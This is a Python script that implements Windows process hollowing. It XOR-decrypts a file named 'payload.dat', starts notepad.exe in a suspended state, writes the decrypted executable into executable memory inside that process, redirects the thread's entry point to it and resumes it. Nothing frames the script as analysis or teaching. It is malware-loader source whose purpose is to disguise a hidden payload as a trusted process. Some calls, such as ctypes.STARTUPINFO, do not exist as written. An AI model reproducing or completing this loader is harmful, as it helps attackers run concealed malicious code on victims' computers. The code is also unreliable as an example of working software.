import ctypes, struct, sys, base64, subprocess

def xor_decrypt(data, key=0x5A):
    return bytes([b ^ key for b in data])

def load_exe_to_memory(data):
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll

    # Read DOS header
    e_lfanew = struct.unpack("<I", data[60:64])[0]
    image_base = struct.unpack("<I", data[e_lfanew+52:e_lfanew+56])[0]
    size_of_image = struct.unpack("<I", data[e_lfanew+80:e_lfanew+84])[0]
    size_of_headers = struct.unpack("<I", data[e_lfanew+84:e_lfanew+88])[0]
    entry_point = struct.unpack("<I", data[e_lfanew+40:e_lfanew+44])[0]

    # Create suspended process
    si = ctypes.STARTUPINFO()
    pi = ctypes.PROCESS_INFORMATION()
    creation_flags = 0x4  # CREATE_SUSPENDED
    exe_path = "C:\\Windows\\System32\\notepad.exe"
    success = kernel32.CreateProcessW(None, exe_path, None, None, False, creation_flags, None, None, ctypes.byref(si), ctypes.byref(pi))
    if not success:
        return False

    # Allocate memory
    base = kernel32.VirtualAllocEx(pi.hProcess, image_base, size_of_image, 0x3000, 0x40)
    if not base:
        base = kernel32.VirtualAllocEx(pi.hProcess, 0, size_of_image, 0x3000, 0x40)
    if not base:
        return False

    # Write headers
    kernel32.WriteProcessMemory(pi.hProcess, base, data[:size_of_headers], size_of_headers, None)

    # Write sections
    num_sections = struct.unpack("<H", data[e_lfanew+6:e_lfanew+8])[0]
    section_offset = e_lfanew + 248
    for i in range(num_sections):
        sect = data[section_offset + 40*i : section_offset + 40*(i+1)]
        virt_addr = struct.unpack("<I", sect[12:16])[0]
        raw_size = struct.unpack("<I", sect[16:20])[0]
        raw_ptr = struct.unpack("<I", sect[20:24])[0]
        if raw_size > 0:
            kernel32.WriteProcessMemory(pi.hProcess, base + virt_addr, data[raw_ptr:raw_ptr+raw_size], raw_size, None)

    # Update context
    context = (ctypes.c_char * 716)()
    ctypes.memset(ctypes.byref(context), 0, 716)
    struct.pack_into("I", context, 0, 0x10001)
    kernel32.GetThreadContext(pi.hThread, ctypes.byref(context))
    struct.pack_into("I", context, 184, base + entry_point)
    kernel32.SetThreadContext(pi.hThread, ctypes.byref(context))

    # Resume thread
    kernel32.ResumeThread(pi.hThread)
    return True

def run():
    with open("payload.dat", "rb") as f:
        encrypted = f.read()
    decrypted = xor_decrypt(encrypted)
    load_exe_to_memory(decrypted)

if __name__ == "__main__":
    run()
